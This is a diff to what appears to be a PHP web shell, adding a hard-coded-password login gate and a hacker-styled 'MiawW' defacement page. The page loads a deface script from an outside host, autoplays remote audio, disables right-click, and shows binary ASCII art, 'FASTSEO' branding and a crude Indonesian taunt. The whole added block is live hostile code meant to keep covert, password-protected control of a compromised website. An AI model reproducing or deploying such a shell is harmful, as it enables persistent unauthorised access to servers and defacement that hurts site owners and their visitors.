@@ -33,6 +33,357 @@ $Array = [
 	$_7 = array_merge($_POST, $_GET);
 	$_r = "required='required'";
 	$gcw = "getcwd";
+	$correctPassword = "kamarbawah"; //Change Password
+	if (isset($_POST['pass'])) {
+		$enteredPassword = $_POST['pass'];
+		if ($enteredPassword === $correctPassword) {
+			$_SESSION['forbidden'] = true;
+		} else {
+			echo '<script>alert("Password Nya Salah Kawan");</script>';
+		}
+	}
+	if (isset($_GET['logout'])) {
+		session_unset();
+		session_destroy();
+		header("Location: ".$_SERVER['PHP_SELF']);
+		exit();
+	}
+	if (!isset($_SESSION['forbidden'])) {
+	?>
+	<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>MiawW Login</title>
+<body>
+<style type="text/css">
+h1 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+ 
+ 
+h2 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+ 
+h3 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+ 
+ 
+h4 {color: #FF0000;font-size: 20px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+ 
+ 
+.matrix {color: #FFFFFF; font-family:Arial, Courier, Monotype; font-size:10pt; text-align:center; width:10px; padding:0px; margin:0px;}
+.jokitz1{
+    text-align : center;
+    }
+.jokitz2{
+    text-align : center;
+    font-family : Courier;
+    }
+</style>
+<script type="text/javascript">
+ 
+<!--
+ 
+//Disable right click script
+ 
+ 
+var message="Dear Admin, Just Edit Index";
+ 
+///////////////////////////////////
+ 
+function clickIE() {if (document.all) {(message);return false;}}
+ 
+function clickNS(e) {if
+ 
+(document.layers||(document.getElementById&&!document.all)) {
+ 
+if (e.which==2||e.which==3) {(message);return false;}}}
+ 
+if (document.layers)
+ 
+{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
+ 
+else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
+ 
+document.oncontextmenu=new Function("return false")
+ 
+// -->
+ 
+</script>
+ 
+<!-- <script language="JavaScript1.2" type="text/javascript">
+ 
+function ClearError() {return true;}
+ 
+window.onerror = ClearError;
+ 
+</script> -->
+ 
+ 
+ 
+ 
+<script type="application/javascript" language="javascript" src="https://nathanprinsley-files.prinsh.com/data-1/js/deface(23-01).js"></script>
+</head>
+<center>
+<font size="-10">
+<pre><font color="black">11110011100110011110010000101011000101001011010110101111011100101111110000011111</font><br><font color="black">00000000001111000100111101100001011111111100111111101111110001101101110110011100</font><br><font color="black">01001111000110101010000011000011100001001111101100010001010100001110110110000101</font><br><font color="black">10001100110100001100100110000000111101110011110111110110110110000101010101011100</font><br><font color="black">01010011110110000111111110001100101110100111010111101110010010110100000000101101</font><br><font color="black">0111111000100011110110000100111</font><font color="#030303">1</font><font color="#010101">1</font><font color="black">0001110001110</font><font color="#020202">10</font><font color="black">00110100011011111101111001000000</font><br><font color="black">01101110100100101010001101111</font><font color="#010101">10</font><font color="#151515">0</font><font color="#0d0d0d">1</font><font color="#040404">1</font><font color="#010101">0</font><font color="black">111011111</font><font color="#040404">0</font><font color="#141414">1</font><font color="#383838">0</font><font color="#3a3a3a">0</font><font color="#060606">1</font><font color="#020202">0</font><font color="#010101">1</font><font color="black">00111011110000001100111010001</font><br><font color="black">0010110000011101000001111</font><font color="#010101">101100</font><font color="#212121">0</font><font color="#282828">1</font><font color="#212121">0</font><font color="#171717">1</font><font color="#0d0d0d">0</font><font color="#050505">0</font><font color="#020202">1</font><font color="#010101">0</font><font color="black">1</font><font color="#020202">1</font><font color="#070707">0</font><font color="#191919">1</font><font color="#3c3c3c">0</font><font color="#6e6e6e">0</font><font color="#a5a5a5">0</font><font color="#c7c7c7">1</font><font color="#9d9d9d">1</font><font color="#121212">0</font><font color="#0e0e0e">1</font><font color="#090909">1</font><font color="#060606">0</font><font color="#030303">0</font><font color="#020202">1</font><font color="#010101">1</font><font color="black">0101100111001111100000010</font><br><font color="black">01011111001100000001</font><font color="#010101">001</font><font color="#020202">1</font><font color="#010101">0</font><font color="#020202">100100</font><font color="#151515">0</font><font color="#3c3c3c">1</font><font color="#3f3f3f">0</font><font color="#414141">0</font><font color="#3d3d3d">0</font><font color="#2f2f2f">0</font><font color="#0f0f0f">1</font><font color="#060606">1</font><font color="#0a0a0a">1</font><font color="#202020">0</font><font color="#393939">0</font><font color="#b6b6b6">0</font><font color="#dcdcdc">0</font><font color="#eeeeee">1</font><font color="#f7f7f7">1</font><font color="#f9f9f9">0</font><font color="#9f9f9f">0</font><font color="#1e1e1e">1</font><font color="#1f1f1f">0</font><font color="#1a1a1a">0</font><font color="#151515">0</font><font color="#111111">1</font><font color="#0e0e0e">1</font><font color="#0b0b0b">0</font><font color="#080808">1</font><font color="#050505">1</font><font color="#040404">0</font><font color="#020202">1</font><font color="#030303">1</font><font color="#010101">01</font><font color="black">110011111001110100</font><br><font color="black">0011000011100000</font><font color="#020202">1</font><font color="#040404">0110000</font><font color="#030303">0</font><font color="#020202">0</font><font color="#030303">011</font><font color="#040404">1</font><font color="#050505">0</font><font color="#0a0a0a">0</font><font color="#4d4d4d">1</font><font color="#555555">0</font><font color="#6d6d6d">1</font><font color="#757575">1</font><font color="#444444">0</font><font color="#2f2f2f">0</font><font color="#151515">1</font><font color="#272727">1</font><font color="#515151">1</font><font color="#5a5a5a">1</font><font color="#5d5d5d">1</font><font color="#c2c2c2">0</font><font color="#f6f6f6">0</font><font color="#f7f7f7">0</font><font color="#f0f0f0">0</font><font color="#888888">1</font><font color="#1e1e1e">0</font><font color="#272727">00</font><font color="#232323">0</font><font color="#1e1e1e">11</font><font color="#1b1b1b">1</font><font color="#171717">0</font><font color="#141414">1</font><font color="#111111">1</font><font color="#0e0e0e">0</font><font color="#0c0c0c">0</font><font color="#0a0a0a">1</font><font color="#080808">0</font><font color="#060606">0</font><font color="#030303">1</font><font color="#020202">1</font><font color="#010101">0</font><font color="black">01010111100000</font><br><font color="black">0111011000100010</font><font color="#030303">0</font><font color="#070707">0</font><font color="#090909">010</font><font color="#0a0a0a">1</font><font color="#090909">1</font><font color="#070707">11</font><font color="#080808">01</font><font color="#090909">00</font><font color="#0b0b0b">0</font><font color="#0c0c0c">0</font><font color="#121212">0</font><font color="#898989">0</font><font color="#888888">1</font><font color="#b6b6b6">1</font><font color="#cccccc">0</font><font color="#b6b6b6">0</font><font color="#616161">1</font><font color="#202020">1</font><font color="#252525">1</font><font color="#636363">1</font><font color="#d8d8d8">0</font><font color="#d1d1d1">0</font><font color="#9d9d9d">1</font><font color="#b9b9b9">1</font><font color="#eeeeee">1</font><font color="#ebebeb">1</font><font color="#313131">1</font><font color="#202020">1</font><font color="#282828">0</font><font color="#2b2a2a">0</font><font color="#2a2b2b">01</font><font color="#2a2a2a">1</font><font color="#282828">1</font><font color="#222222">1</font><font color="#202020">0</font><font color="#1f1f1f">0</font><font color="#1b1b1b">0</font><font color="#1a1a1a">1</font><font color="#181818">0</font><font color="#151515">1</font><font color="#101010">1</font><font color="#0b0b0b">1</font><font color="#050505">0</font><font color="#020202">0</font><font color="black">10101011111011</font><br><font color="black">11010110100101000</font><font color="#040404">1</font><font color="#090909">0</font><font color="#0c0c0c">1</font><font color="#0b0b0b">1</font><font color="#0a0a0a">010</font><font color="#090909">0</font><font color="#0d0d0d">111</font><font color="#0e0e0e">10</font><font color="#101010">0</font><font color="#141414">0</font><font color="#6d6d6d">1</font><font color="#cfcfcf">1</font><font color="#d2d2d2">1</font><font color="#d7d7d7">1</font><font color="#c6c6c6">0</font><font color="#3f3f3f">0</font><font color="#1b1b1b">1</font><font color="#3b3b3b">1</font><font color="#4d4d4d">1</font><font color="#969696">1</font><font color="#e8e8e8">1</font><font color="#e4e4e4">1</font><font color="#dddddd">1</font><font color="#e5e5e5">0</font><font color="#c9c9c9">0</font><font color="#1b1a19">0</font><font color="#232222">1</font><font color="#342526">1</font><font color="#5b2021">1</font><font color="#3e2623">1</font><font color="#332929">0</font><font color="#2b2b2b">00</font><font color="#272727">1</font><font color="#282828">10</font><font color="#262626">0</font><font color="#232323">1</font><font color="#222222">1</font><font color="#1b1b1b">1</font><font color="#181818">1</font><font color="#131313">1</font><font color="#0a0a0a">0</font><font color="#050505">1</font><font color="#020202">1</font><font color="black">0001100001011</font><br><font color="black">110111111111100</font><font color="#010101">000</font><font color="#040404">1</font><font color="#0a0a0a">10</font><font color="#080808">10</font><font color="#0a0a0a">0</font><font color="#080808">1</font><font color="#0a0a0a">1</font><font color="#0e0e0e">0111</font><font color="#0f0f0f">1</font><font color="#111111">1</font><font color="#262626">1</font><font color="#bcbcbc">1</font><font color="#d3d3d3">11</font><font color="#b5b5b5">0</font><font color="#252525">1</font><font color="#1e1e1e">1</font><font color="#3c3c3c">0</font><font color="#484848">1</font><font color="#595959">1</font><font color="#e1e1e1">0</font><font color="#e0e0e0">0</font><font color="#dadada">1</font><font color="#dddddd">1</font><font color="#878787">1</font><font color="#1a1a1b">0</font><font color="#252321">0</font><font color="#631b1a">0</font><font color="#ba0f10">0</font><font color="#a91212">1</font><font color="#3f2523">1</font><font color="#2a2a2a">1</font><font color="#282828">0</font><font color="#292929">1</font><font color="#2a2a2a">0</font><font color="#282828">0</font><font color="#252525">0</font><font color="#212121">1</font><font color="#1d1d1d">1</font><font color="#181818">1</font><font color="#1c1c1c">0</font><font color="#131313">0</font><font color="#0d0d0d">1</font><font color="#080808">1</font><font color="#040404">0</font><font color="#010101">0</font><font color="black">100010110111</font><br><font color="black">1111001101010010</font><font color="#010101">1</font><font color="#030303">0</font><font color="#040404">0</font><font color="#060606">1</font><font color="#080808">0</font><font color="#050505">1</font><font color="#040404">1</font><font color="#060606">0</font><font color="#090909">11</font><font color="#0a0a0a">1</font><font color="#0e0e0e">110</font><font color="#0f0f0f">10</font><font color="#141414">1</font><font color="#676767">1</font><font color="#d2d2d2">1</font><font color="#d1d1d1">1</font><font color="#acacac">0</font><font color="#1b1b1b">1</font><font color="#1f1f1f">1</font><font color="#2d2d2d">0</font><font color="#383838">0</font><font color="#3e3e3e">0</font><font color="#cecece">1</font><font color="#d7d7d7">0</font><font color="#d8d8d8">1</font><font color="#d9d9d9">0</font><font color="#343434">1</font><font color="#1f1e1d">0</font><font color="#212122">0</font><font color="#2b2223">0</font><font color="#2d2323">0</font><font color="#302525">0</font><font color="#2b2628">1</font><font color="#252525">0</font><font color="#262626">1</font><font color="#272727">11</font><font color="#262626">0</font><font color="#212121">0</font><font color="#171717">0</font><font color="#101010">0</font><font color="#0f0f0f">0</font><font color="#121212">1</font><font color="#161616">0</font><font color="#131313">1</font><font color="#0a0a0a">0</font><font color="#040404">1</font><font color="#010101">1</font><font color="black">111000110101</font><br><font color="black">10111000011011100</font><font color="#010101">1</font><font color="#030303">0</font><font color="#040404">1</font><font color="#050505">1</font><font color="#030303">0</font><font color="#040404">11</font><font color="#060606">1</font><font color="#080808">1</font><font color="#0a0a0a">0</font><font color="#0b0b0b">0</font><font color="#0e0e0e">111</font><font color="#0f0f0f">1</font><font color="#111111">0</font><font color="#1b1b1b">1</font><font color="#b1b1b1">0</font><font color="#cccccc">1</font><font color="#919191">1</font><font color="#1b1b1b">1</font><font color="#1c1c1c">0</font><font color="#252525">1</font><font color="#343434">1</font><font color="#444444">0</font><font color="#a9a9a9">0</font><font color="#c9c9c9">1</font><font color="#cfcfcf">1</font><font color="#949494">1</font><font color="#171717">1</font><font color="#1f1f1f">1</font><font color="#212222">0</font><font color="#222222">110</font><font color="#232323">0</font><font color="#252525">1</font><font color="#232323">1</font><font color="#242424">100</font><font color="#1c1c1c">1</font><font color="#111111">0</font><font color="#0d0d0d">1</font><font color="#151515">0</font><font color="#1a1a1a">1</font><font color="#1d1d1d">0</font><font color="#151515">1</font><font color="#0b0b0b">0</font><font color="#040404">0</font><font color="#010101">1</font><font color="black">100110110010</font><br><font color="black">10010000001010001</font><font color="#020202">0</font><font color="#040404">1</font><font color="#080808">0</font><font color="#040404">0</font><font color="black">0</font><font color="#030303">0</font><font color="#040404">01</font><font color="#050505">1</font><font color="#080808">0</font><font color="#0c0c0c">0</font><font color="#0a0a0a">1</font><font color="#0d0d0d">0</font><font color="#0e0e0e">00</font><font color="#101010">0</font><font color="#131313">1</font><font color="#4f4f4f">1</font><font color="#c2c2c2">1</font><font color="#6c6c6c">0</font><font color="#1d1d1d">1</font><font color="#1c1c1c">1</font><font color="#212121">0</font><font color="#2d2d2d">1</font><font color="#3f3f3f">0</font><font color="#8f8f8f">0</font><font color="#c1c1c1">0</font><font color="#bdbdbd">1</font><font color="#323232">1</font><font color="#181818">0</font><font color="#1e1e1e">1</font><font color="#1f1f1f">1</font><font color="#1e1e1e">11</font><font color="#1c1c1c">00</font><font color="#202020">1</font><font color="#212121">0</font><font color="#232323">0</font><font color="#252525">01</font><font color="#1b1b1b">0</font><font color="#101010">0</font><font color="#131313">0</font><font color="#171717">0</font><font color="#1a1a1a">0</font><font color="#181818">1</font><font color="#111111">1</font><font color="#0b0b0b">1</font><font color="#050505">1</font><font color="#020202">1</font><font color="black">000000111111</font><br><font color="black">111001101000010</font><font color="#010101">10</font><font color="#020202">0</font><font color="#030303">1</font><font color="#050505">1</font><font color="#060606">1</font><font color="#020202">1</font><font color="#010101">1</font><font color="#020202">1</font><font color="#030303">0</font><font color="#050505">0</font><font color="#060606">0</font><font color="#0a0a0a">1</font><font color="#0b0b0b">0</font><font color="#090909">1</font><font color="#0d0d0d">1</font><font color="#0e0e0e">0</font><font color="#0f0f0f">0</font><font color="#111111">1</font><font color="#181818">0</font><font color="#828282">1</font><font color="#515151">0</font><font color="#1c1c1c">01</font><font color="#1e1e1e">0</font><font color="#272727">0</font><font color="#2d2d2d">1</font><font color="#7b7b7b">0</font><font color="#c3c3c3">1</font><font color="#616161">1</font><font color="#131313">0</font><font color="#191919">0</font><font color="#1e1e1e">0</font><font color="#202020">1</font><font color="#212121">1</font><font color="#202020">0</font><font color="#222222">11</font><font color="#212121">001</font><font color="#202020">1</font><font color="#1f1f1f">0</font><font color="#141414">1</font><font color="#101010">1</font><font color="#141414">0</font><font color="#191919">1</font><font color="#171717">0</font><font color="#181818">0</font><font color="#141414">1</font><font color="#131313">0</font><font color="#090909">1</font><font color="#040404">1</font><font color="#010101">0</font><font color="black">01010101010</font><br><font color="black">1001100101110111</font><font color="#010101">0</font><font color="#030303">0</font><font color="#040404">0</font><font color="#050505">1</font><font color="#060606">0</font><font color="#030303">1</font><font color="black">0</font><font color="#010101">1</font><font color="#020202">01</font><font color="#030303">0</font><font color="#060606">0</font><font color="#0c0c0c">0</font><font color="#0b0b0b">1</font><font color="#080808">1</font><font color="#0c0c0c">1</font><font color="#0e0e0e">01</font><font color="#111111">0</font><font color="#2f2f2f">0</font><font color="#393939">1</font><font color="#191919">1</font><font color="#1b1b1b">1</font><font color="#212121">1</font><font color="#282828">0</font><font color="#1c1c1c">1</font><font color="#5c5c5c">0</font><font color="#979797">1</font><font color="#161616">1</font><font color="#131313">1</font><font color="#181818">1</font><font color="#1b1b1b">1</font><font color="#1d1d1d">0</font><font color="#191919">1</font><font color="#1b1b1b">0</font><font color="#202020">1</font><font color="#1e1e1e">1</font><font color="#1b1b1b">0011</font><font color="#1a1a1a">1</font><font color="#101010">0</font><font color="#111111">1</font><font color="#171717">1</font><font color="#1c1c1c">1</font><font color="#1d1d1d">1</font><font color="#171717">0</font><font color="#191919">0</font><font color="#151515">0</font><font color="#090909">1</font><font color="#050505">1</font><font color="#020202">0</font><font color="black">11001110110</font><br><font color="black">110010110100011</font><font color="#010101">0</font><font color="#040404">1</font><font color="#050505">1</font><font color="#030303">0</font><font color="#020202">0</font><font color="#040404">0</font><font color="#050505">0</font><font color="black">00</font><font color="#020202">011</font><font color="#030303">0</font><font color="#080808">0</font><font color="#0e0e0e">0</font><font color="#0b0b0b">1</font><font color="#060606">1</font><font color="#0b0b0b">0</font><font color="#0c0c0c">0</font><font color="#0e0e0e">1</font><font color="#131313">0</font><font color="#161616">10</font><font color="#1a1a1a">0</font><font color="#1f1f1f">1</font><font color="#282828">0</font><font color="#1c1c1c">0</font><font color="#343434">1</font><font color="#3d3d3d">0</font><font color="#0f0f0f">1</font><font color="#131313">0</font><font color="#151515">1</font><font color="#161616">1</font><font color="#111111">0</font><font color="#0c0c0c">0</font><font color="#0f0f0f">1</font><font color="#141414">1</font><font color="#151515">01</font><font color="#161616">0</font><font color="#171717">1</font><font color="#181818">0</font><font color="#151515">0</font><font color="#090909">1</font><font color="#121212">0</font><font color="#161616">1</font><font color="#181818">1</font><font color="#171717">0</font><font color="#181818">0</font><font color="#171717">0</font><font color="#111111">1</font><font color="#0a0a0a">0</font><font color="#060606">0</font><font color="#020202">0</font><font color="#010101">0</font><font color="black">1101010010</font><br><font color="black">1110110101010001</font><font color="#010101">0</font><font color="#040404">1</font><font color="#070707">0</font><font color="#060606">0</font><font color="#050505">1</font><font color="#040404">0</font><font color="#020202">0</font><font color="black">0</font><font color="#020202">10100</font><font color="#0b0b0b">1</font><font color="#101010">0</font><font color="#0b0b0b">0</font><font color="#050505">0</font><font color="#090909">0</font><font color="#0b0b0b">1</font><font color="#0d0d0d">0</font><font color="#121212">1</font><font color="#080808">1</font><font color="#131313">1</font><font color="#1c1c1c">0</font><font color="#272727">1</font><font color="#181818">0</font><font color="#101010">1</font><font color="#121212">0</font><font color="#0f0f0f">1</font><font color="#121212">11</font><font color="#151515">1</font><font color="#141414">0</font><font color="#0e0e0e">1</font><font color="#0d0d0d">0</font><font color="#121212">1</font><font color="#131313">00001</font><font color="#0e0e0e">1</font><font color="#050505">1</font><font color="#0e0e0e">1</font><font color="#121212">1</font><font color="#131313">0</font><font color="#161616">0</font><font color="#171717">0</font><font color="#141414">1</font><font color="#101010">0</font><font color="#0b0b0b">1</font><font color="#050505">1</font><font color="#020202">0</font><font color="black">10001000100</font><br><font color="black">01110010101010100</font><font color="#010101">0</font><font color="#050505">1</font><font color="#0a0a0a">1</font><font color="#070707">1</font><font color="#020202">0</font><font color="#010101">0</font><font color="black">0</font><font color="#010101">1</font><font color="#020202">1100</font><font color="#040404">0</font><font color="#0d0d0d">0</font><font color="#111111">0</font><font color="#0d0d0d">0</font><font color="#050505">0</font><font color="#070707">1</font><font color="#090909">1</font><font color="#0c0c0c">011</font><font color="#161616">1</font><font color="#1f1f1f">0</font><font color="#0d0d0d">1</font><font color="#070707">1</font><font color="#0c0c0c">1</font><font color="#0d0d0d">0</font><font color="#0e0e0e">1</font><font color="#0f0f0f">1</font><font color="#111111">00</font><font color="#0e0e0e">1</font><font color="#0d0d0d">0</font><font color="#101010">11</font><font color="#0f0f0f">1</font><font color="#0e0e0e">11</font><font color="#0f0f0f">1</font><font color="#080808">01</font><font color="#0e0e0e">1</font><font color="#111111">1</font><font color="#131313">1</font><font color="#141414">0</font><font color="#111111">0</font><font color="#0e0e0e">0</font><font color="#0c0c0c">0</font><font color="#070707">1</font><font color="#040404">0</font><font color="#020202">1</font><font color="black">01000100111</font><br><font color="black">101101001010011</font><font color="#020202">0</font><font color="#010101">0</font><font color="black">1</font><font color="#010101">0</font><font color="#060606">1</font><font color="#080808">0</font><font color="#040404">1</font><font color="#010101">0</font><font color="black">0</font><font color="#010101">0110</font><font color="#020202">01</font><font color="#070707">0</font><font color="#0d0d0d">1</font><font color="#121212">1</font><font color="#0f0f0f">1</font><font color="#040404">1</font><font color="#050505">1</font><font color="#080808">0</font><font color="#0b0b0b">0</font><font color="#0d0d0d">1</font><font color="#191919">0</font><font color="#161616">1</font><font color="#050505">1</font><font color="#090909">0</font><font color="#0b0b0b">10</font><font color="#0c0c0c">1</font><font color="#0d0d0d">0</font><font color="#0f0f0f">10</font><font color="#0d0d0d">1</font><font color="#0e0e0e">0</font><font color="#101010">1</font><font color="#0e0e0e">1</font><font color="#0c0c0c">1</font><font color="#090909">0</font><font color="#0a0a0a">0</font><font color="#0b0b0b">0</font><font color="#060606">1</font><font color="#0d0d0d">0</font><font color="#0e0e0e">0</font><font color="#0c0c0c">0</font><font color="#0f0f0f">1</font><font color="#111111">01</font><font color="#101010">1</font><font color="#0c0c0c">1</font><font color="#080808">0</font><font color="#040404">0</font><font color="#020202">0</font><font color="black">10101000101</font><br><font color="black">100100111010011</font><font color="#010101">1</font><font color="#030303">0</font><font color="#040404">10</font><font color="#030303">1</font><font color="#040404">0</font><font color="#060606">01</font><font color="#030303">0</font><font color="black">1</font><font color="#010101">01111</font><font color="#030303">0</font><font color="#070707">0</font><font color="#0d0d0d">1</font><font color="#131313">1</font><font color="#111111">1</font><font color="#050505">0</font><font color="#040404">0</font><font color="#070707">0</font><font color="#0a0a0a">1</font><font color="#151515">0</font><font color="#070707">1</font><font color="#050505">1</font><font color="#090909">11</font><font color="#0a0a0a">1</font><font color="#0b0b0b">1</font><font color="#0c0c0c">0</font><font color="#0d0d0d">0</font><font color="#0c0c0c">0</font><font color="#0d0d0d">0</font><font color="#0e0e0e">1</font><font color="#0f0f0f">0</font><font color="#0d0d0d">1</font><font color="#0a0a0a">1</font><font color="#060606">10</font><font color="#080808">1</font><font color="#050505">0</font><font color="#0a0a0a">0</font><font color="#0b0b0b">1</font><font color="#090909">0</font><font color="#0e0e0e">0</font><font color="#121212">0</font><font color="#111111">0</font><font color="#0d0d0d">1</font><font color="#080808">1</font><font color="#050505">0</font><font color="#040404">0</font><font color="#020202">1</font><font color="black">00010111001</font><br><font color="black">1101101110010000</font><font color="#010101">00</font><font color="#020202">010</font><font color="#030303">1</font><font color="#060606">0</font><font color="#040404">0</font><font color="#010101">1101010</font><font color="#040404">0</font><font color="#080808">1</font><font color="#0d0d0d">0</font><font color="#111111">0</font><font color="#0f0f0f">1</font><font color="#050505">0</font><font color="#030303">0</font><font color="#050505">1</font><font color="#080808">1</font><font color="#050505">1</font><font color="#060606">0</font><font color="#080808">0</font><font color="#090909">0</font><font color="#0a0a0a">0</font><font color="#0b0b0b">1</font><font color="#0d0d0d">01</font><font color="#0b0b0b">0</font><font color="#0d0d0d">11</font><font color="#0e0e0e">0</font><font color="#0c0c0c">0</font><font color="#0a0a0a">1</font><font color="#050505">0</font><font color="#020202">1</font><font color="#030303">0</font><font color="#080808">0</font><font color="#0c0c0c">1</font><font color="#0e0e0e">1</font><font color="#111111">1</font><font color="#121212">1</font><font color="#101010">1</font><font color="#0b0b0b">1</font><font color="#080808">0</font><font color="#060606">1</font><font color="#040404">0</font><font color="#030303">1</font><font color="#010101">1</font><font color="black">10101111110</font><br><font color="black">011000111011101010</font><font color="#020202">1</font><font color="#030303">1</font><font color="#060606">0</font><font color="#080808">1</font><font color="#060606">0</font><font color="#030303">1</font><font color="#040404">1</font><font color="#060606">1</font><font color="#020202">0</font><font color="#010101">0101</font><font color="#030303">0</font><font color="#050505">1</font><font color="#090909">0</font><font color="#0d0d0d">0</font><font color="#101010">1</font><font color="#0d0d0d">1</font><font color="#060606">1</font><font color="#030303">00</font><font color="#050505">1</font><font color="#060606">0</font><font color="#080808">1</font><font color="#090909">0</font><font color="#0a0a0a">1</font><font color="#0b0b0b">1</font><font color="#0d0d0d">1</font><font color="#0c0c0c">010</font><font color="#0b0b0b">1</font><font color="#0a0a0a">01</font><font color="#0b0b0b">1</font><font color="#050505">0</font><font color="#020202">0</font><font color="#060606">0</font><font color="#0d0d0d">1</font><font color="#111111">0</font><font color="#151515">00</font><font color="#161616">0</font><font color="#151515">0</font><font color="#101010">0</font><font color="#0a0a0a">0</font><font color="#060606">0</font><font color="#050505">1</font><font color="#030303">0</font><font color="#010101">1</font><font color="black">01000000011</font><br><font color="black">010100111111111001</font><font color="#010101">111</font><font color="#030303">0</font><font color="#060606">1</font><font color="#090909">1</font><font color="#080808">1</font><font color="#060606">0</font><font color="#080808">1</font><font color="#040404">0</font><font color="#010101">0100</font><font color="#030303">0</font><font color="#060606">0</font><font color="#0a0a0a">0</font><font color="#0e0e0e">0</font><font color="#0f0f0f">0</font><font color="#0a0a0a">0</font><font color="#030303">1</font><font color="#040404">1</font><font color="#060606">1</font><font color="#070707">00</font><font color="#080808">1</font><font color="#090909">11</font><font color="#0a0a0a">1</font><font color="#0b0b0b">1</font><font color="#0c0c0c">0</font><font color="#0a0a0a">10</font><font color="#090909">1</font><font color="#0a0a0a">01</font><font color="#080808">0</font><font color="#090909">0</font><font color="#0c0c0c">1</font><font color="#0e0e0e">0</font><font color="#0f0f0f">1</font><font color="#111111">0</font><font color="#151515">01</font><font color="#101010">0</font><font color="#0c0c0c">0</font><font color="#080808">0</font><font color="#050505">1</font><font color="#040404">1</font><font color="#030303">0</font><font color="#010101">1</font><font color="black">00001000101</font><br><font color="black">011110001100111110</font><font color="#010101">1</font><font color="#020202">1011</font><font color="#030303">1</font><font color="#070707">1</font><font color="#080808">001</font><font color="#060606">0</font><font color="#010101">000</font><font color="#020202">1</font><font color="#040404">1</font><font color="#070707">1</font><font color="#0a0a0a">0</font><font color="#0e0e0e">0</font><font color="#0c0c0c">0</font><font color="#040404">0</font><font color="#060606">0</font><font color="#090909">1</font><font color="#080808">0</font><font color="#070707">1</font><font color="#080808">0110</font><font color="#090909">0</font><font color="#0a0a0a">1</font><font color="#080808">11</font><font color="#070707">0</font><font color="#080808">0</font><font color="#090909">1</font><font color="#0b0b0b">0</font><font color="#0e0e0e">000011</font><font color="#0c0c0c">0</font><font color="#090909">0</font><font color="#080808">1</font><font color="#060606">0</font><font color="#040404">0</font><font color="#030303">1</font><font color="#020202">0</font><font color="black">010110101000</font><br><font color="black">10010000111011000110</font><font color="#010101">1</font><font color="#020202">1</font><font color="#030303">1</font><font color="#010101">0</font><font color="#020202">1</font><font color="#040404">1</font><font color="#060606">0</font><font color="#070707">11</font><font color="#050505">1</font><font color="#010101">101</font><font color="#020202">0</font><font color="#040404">0</font><font color="#070707">1</font><font color="#0c0c0c">1</font><font color="#0e0e0e">0</font><font color="#080808">0</font><font color="#060606">00</font><font color="#090909">0</font><font color="#080808">1</font><font color="#070707">1</font><font color="#080808">00</font><font color="#070707">11</font><font color="#060606">1</font><font color="#050505">0</font><font color="#060606">1</font><font color="#080808">0</font><font color="#0a0a0a">0</font><font color="#0c0c0c">11</font><font color="#0d0d0d">0</font><font color="#0e0e0e">1</font><font color="#111111">0</font><font color="#131313">1</font><font color="#0f0f0f">0</font><font color="#0b0b0b">0</font><font color="#070707">0</font><font color="#050505">11</font><font color="#040404">1</font><font color="#030303">0</font><font color="#020202">1</font><font color="black">1111100010011</font><br>
+</pre></font>    
+ 
+<br>
+<audio src="https://fastseo.site/masik/sepuh.mp3" autoplay="1" loop="1"></audio>
+<h1>FASTSEO</h1>
+ 
+ 
+<div id="matrix" class="auto-style8">MiawW IS HERE !!!</div><br>
+<font face="courier new" color="Red" size"10" >CITA CITA KU MENJADI SOPTEK AGAR KU BISA MENG KOKOP M****K
+ </font>
+ 
+ 
+<center>
+ 
+<hr width="550px" style='color:cyan;'>
+ 
+<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
+ 
+<span style='font: 15px Lucida Handwriting;size:15px;color:cyan;text-shadow: 0px 0px 50px;'><strong>
+<style type="text/css">
+<span style='font: 100px>
+ body{
+  font-family: Trebuchet MS, Lucida Sans Unicode, Arial, sans-serif;
+  margin-top:0px;
+   background-repeat:no-repeat;
+  padding-top:26px;
+ }
+    #myContent, #myContent blink{
+        width:0%px;
+        height:0%px;
+        background:black;
+        color: #00FFFF;
+        font-family:IceLand;
+        font-size:20px;
+    }    
+    blink{
+        display:inline;
+    }
+    </style><br />
+    <script type="text/javascript">
+  var charIndex = -1;
+    var stringLength = 0;
+    var inputText;
+    function writeContent(init){
+     if(init){
+      inputText = document.getElementById('contentToWrite').innerHTML;
+     }
+        if(charIndex==-1){
+            charIndex = 0;
+            stringLength = inputText.length;
+        }
+        var initString = document.getElementById('myContent').innerHTML;
+  initString = initString.replace(/<SPAN.*$/gi,"");
+       
+       var theChar = inputText.charAt(charIndex);
+       var nextFourChars = inputText.substr(charIndex,4);
+       if(nextFourChars=='<br>' || nextFourChars=='<br>'){
+         theChar  = '<br>';
+         charIndex+=3;
+        }
+        initString = initString + theChar + "<span id='blink'>_</SPAN>";
+        document.getElementById('myContent').innerHTML = initString;
+ 
+        charIndex = charIndex/1 +1;
+  if(charIndex%2==1){
+             document.getElementById('blink').style.display='font: 100px';
+        }else{
+             document.getElementById('blink').style.display='inline';
+        }
+               
+        if(charIndex<=stringLength){
+           setTimeout('writeContent(false)',100);
+       }else{
+        blinkSpan();
+       }  
+   }
+       var currentStyle = 'inline';
+   function blinkSpan(){
+    if(currentStyle=='inline'){
+     currentStyle='none';
+    }else{
+     currentStyle='inline';
+    }
+    document.getElementById('blink').style.display = currentStyle;
+    setTimeout('blinkSpan()',9999999);
+   
+   }
+   </script>
+</html>
